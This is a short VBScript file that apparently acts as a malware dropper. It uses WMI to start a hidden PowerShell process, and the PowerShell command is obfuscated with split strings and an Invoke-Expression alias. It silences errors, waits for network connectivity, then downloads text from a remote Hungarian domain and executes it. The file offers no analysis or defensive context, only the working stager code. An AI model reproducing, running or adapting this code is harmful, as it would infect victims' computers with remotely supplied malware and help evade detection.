

Set oProcess = GetObject("winmgmts:Win32_Process")
Set objStartup = GetObject("winmgmts:Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0
Set oInParams = oProcess.Methods_("Create"). _
    InParameters.SpawnInstance_


oInParams.CommandLine = "Powershell " + mkwelld() + welllf()
oInParams.ProcessStartupInformation = objConfig



Set oOutParams = oProcess.ExecMethod_("Create", oInParams)

Function mkwelld()
mkwelld="$t0='DE5'.replace('D','I').replace('5','x');sal P $t0;$ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void' + '] [Syst' + 'em.Refle' + 'ct"

End Function 

Function welllf()
welllf="ion.Asse' + 'mbly]::LoadWi' + 'thPartialName(''Microsoft.VisualBasic'')'|P;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)'|P;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Down' + 'load' + 'Str' + 'ing',[Microsoft.VisualBasic.CallType]::Method,'h' + 'tt' + 'ps' + '://complexdental.hu/menu.txt')|P"
End Function 